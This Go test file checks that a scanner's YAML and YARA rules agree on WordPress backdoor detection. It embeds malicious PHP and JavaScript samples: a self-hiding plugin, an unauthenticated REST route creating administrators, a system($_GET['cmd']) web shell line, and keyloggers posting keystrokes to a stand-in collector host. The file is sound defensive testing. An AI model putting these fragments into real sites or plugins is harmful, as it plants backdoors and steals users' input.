//go:build yara

package yara_test

import (
	"path/filepath"
	"runtime"
	"testing"

	"github.com/pidginhost/csm/internal/signatures"
	csmyara "github.com/pidginhost/csm/internal/yara"
)

func TestRepositoryBackdoorRulesMatchScannerParity(t *testing.T) {
	_, thisFile, _, ok := runtime.Caller(0)
	if !ok {
		t.Fatal("runtime.Caller failed")
	}
	configsDir := filepath.Join(filepath.Dir(thisFile), "..", "..", "configs")

	yaraScanner, err := csmyara.NewScanner(configsDir)
	if err != nil {
		t.Fatalf("loading YARA rules: %v", err)
	}
	yamlScanner := signatures.NewScanner(configsDir)
	if err := yamlScanner.LoadError(); err != nil {
		t.Fatalf("loading YAML rules: %v", err)
	}

	tests := []struct {
		name   string
		rule   string
		want   bool
		sample string
	}{
		{
			name: "self-hiding incident loader",
			rule: "wp_plugin_self_hiding",
			want: true,
			sample: `<?php
ADD_FILTER ('all_plugins', function ($plugins) {
    if (isset ($_GET['sp'])) { return $plugins; }
    $self = plugin_basename (__FILE__);
    UNSET ($plugins[$self]);
    return $plugins;
});`,
		},
		{
			name: "legitimate self-hiding branding plugin",
			rule: "wp_plugin_self_hiding",
			sample: `<?php
add_filter('all_plugins', function ($plugins) {
    if (get_option('agency_hide_branding')) {
        unset($plugins[plugin_basename(__FILE__)]);
    }
    return $plugins;
});
function agency_share_preview() {
    if (isset($_GET['sp'])) { return sanitize_text_field($_GET['sp']); }
}`,
		},
		{
			name: "request flag and separate branding callback",
			rule: "wp_plugin_self_hiding",
			sample: `<?php
add_filter('all_plugins', function ($plugins) {
    if (isset($_GET['sp'])) { audit_share_preview($_GET['sp']); }
    return $plugins;
});
function hide_agency_branding($plugins) {
    $self = plugin_basename(__FILE__);
    unset($plugins[$self]);
    return $plugins;
}`,
		},
		{
			name: "open command route creating administrator",
			rule: "wp_rest_unauth_admin_create",
			want: true,
			sample: `<?php
register_rest_route ($namespace, '/command', array(
    'methods' => 'POST',
    'callback' => 'wpeditor_handle_command',
    'permission_callback' => '__return_true',
));
$id = WP_Create_User ($login, $password, $email);
$user = new WP_User($id);
$user->set_role ('administrator');`,
		},
		{
			name: "membership registration and admin management",
			rule: "wp_rest_unauth_admin_create",
			sample: `<?php
register_rest_route('membership/v1', '/register', array(
    'callback' => 'membership_register',
    'permission_callback' => '__return_true',
));
function membership_register($request) {
    return wp_insert_user(array('user_login' => $request['login'], 'role' => 'subscriber'));
}
function membership_promote($id) {
    if (current_user_can('promote_users')) {
        return wp_update_user(array('ID' => $id, 'role' => 'administrator'));
    }
}`,
		},
		{
			name: "open create-admin route using wp_insert_user",
			rule: "wp_rest_unauth_admin_create",
			want: true,
			sample: `<?php
register_rest_route('wpu/v1', '/create-admin', array(
    'callback' => 'wpu_add_admin',
    'permission_callback' => '__return_true',
));
return wp_insert_user(array(
    'user_login' => $login,
    'user_pass' => $password,
    'role' => 'administrator',
));`,
		},
		{
			name: "protected command followed by open read route",
			rule: "wp_rest_unauth_admin_create",
			sample: `<?php
register_rest_route('membership/v1', '/command', array(
    'callback' => 'membership_admin_command',
    'permission_callback' => 'membership_can_manage_users',
));
register_rest_route('membership/v1', '/plans', array(
    'callback' => 'membership_list_plans',
    'permission_callback' => '__return_true',
));
$id = wp_create_user($login, $password);
(new WP_User($id))->set_role('administrator');`,
		},
		{
			name: "chr chain with PHP whitespace",
			rule: "php_chr_chain_obfuscation",
			want: true,
			sample: `<?php
$key = ImPlOdE ('', ArRaY (ChR (116), ChR (121), ChR (112), ChR (101)));`,
		},
		{
			name:   "ordinary chr calls",
			rule:   "php_chr_chain_obfuscation",
			sample: `<?php $tab = chr(9); $newline = chr(10) . chr(13);`,
		},
		{
			name:   "hex-escaped incident URL",
			rule:   "php_hex_escaped_url",
			want:   true,
			sample: `<?php $url = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x65\x76\x69\x6c";`,
		},
		{
			name:   "plain URL",
			rule:   "php_hex_escaped_url",
			sample: `<?php $url = "https://api.example.test";`,
		},
		{
			name: "hardened timthumb with webshot disabled",
			rule: "exploit_timthumb",
			sample: `<?php
if(! defined('WEBSHOT_ENABLED') ) define('WEBSHOT_ENABLED', false);
class timthumb {
    public static $version = '2.8.14';
    function run() {
        $nullImg = base64_decode("R0lGODlhUAAMAIAAAP8AAP");
        $fp = fopen($this->cachefile, 'rb');
        @fpassthru($fp);
    }
}`,
		},
		{
			name: "webshot-enabled timthumb",
			rule: "exploit_timthumb",
			want: true,
			sample: `<?php
define('WEBSHOT_ENABLED', true);
function timthumb() { /* remote fetch, webshot RCE reachable */ }`,
		},
		{
			name: "backdoored timthumb with injected exec sink",
			rule: "exploit_timthumb",
			want: true,
			sample: `<?php
if(! defined('WEBSHOT_ENABLED') ) define('WEBSHOT_ENABLED', false);
function timthumb() {}
system($_GET['cmd']);`,
		},
		{
			name: "enter-key comparison near unrelated fetch",
			rule: "exfil_keylogger_js",
			sample: `onKeyDown:function(e){return t.handleKeydown(e)},"handleKeydown",` +
				`(function(e){if((e.which||e.keyCode)===ct.KeyCode.RETURN)t.openLink(e)})),` +
				`fetch("https://api.example.test/wp-json/wp/v2/media/"+t).then((function(e){return e.json()}))`,
		},
		{
			name: "keystroke buffer accumulated and posted",
			rule: "exfil_keylogger_js",
			want: true,
			sample: `var b="";document.addEventListener("keydown",function(e){b+=String.fromCharCode(e.keyCode);` +
				`fetch("https://collect.example.test/c",{method:"POST",body:b})});`,
		},
		{
			name: "keystroke serialized into request body",
			rule: "exfil_keylogger_js",
			want: true,
			sample: `document.addEventListener('keypress',function(e){` +
				`fetch('/assets/collect',{method:'POST',body:JSON.stringify({key:e.key,value:e.target.value})});});`,
		},
	}

	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			yamlHit := hasSignatureRule(yamlScanner.ScanContent([]byte(tc.sample), ".php"), tc.rule)
			yaraHit := hasRepositoryYaraRule(yaraScanner.ScanBytes([]byte(tc.sample)), tc.rule)
			if yamlHit != yaraHit {
				t.Fatalf("%s outcome differs: YAML=%t YARA=%t", tc.rule, yamlHit, yaraHit)
			}
			if yamlHit != tc.want {
				t.Errorf("%s outcome = %t, want %t", tc.rule, yamlHit, tc.want)
			}
		})
	}
}

func hasSignatureRule(matches []signatures.Match, name string) bool {
	for _, match := range matches {
		if match.RuleName == name {
			return true
		}
	}
	return false
}

func hasRepositoryYaraRule(matches []csmyara.Match, name string) bool {
	for _, match := range matches {
		if match.RuleName == name {
			return true
		}
	}
	return false
}
